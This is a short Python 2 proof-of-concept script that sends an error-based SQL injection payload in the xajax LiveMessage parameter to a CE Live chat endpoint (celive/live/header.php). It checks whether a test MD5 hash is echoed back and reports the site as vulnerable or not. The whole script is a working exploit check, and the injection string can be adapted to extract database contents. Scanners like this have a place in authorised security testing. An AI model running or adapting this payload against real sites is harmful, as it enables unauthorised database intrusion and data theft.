#!/usr/bin/env python
# coding:utf-8
import urllib2
import urllib
import sys
import hashlib


def verify(url):
    target = "%s/celive/live/header.php" % url
    # data to be sent
    post_data = {
        'xajax': 'LiveMessage',
        'xajaxargs[0][name]': (
            "1',(SELECT 1 FROM (select count(*),concat("
            "floor(rand(0)*2),(select md5(233)))a from "
            "information_schema.tables group by a)b),"
            "'','','','1','127.0.0.1','2') #"
        )
    }
    try:
        request = urllib2.Request(target, data=urllib.urlencode(post_data))
        response = urllib2.urlopen(request)
        if response:
            # process
            data = response.read()
            if hashlib.md5('233').hexdigest() in data:
                print target + " is vulnerable"
            else:
                print target + " is not vulnerable"
    except Exception, e:
        print "Something happend..."
        print e


def main():
    args = sys.argv

    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print "Usage: python %s url" % (args[0])

if __name__ == '__main__':
    main()
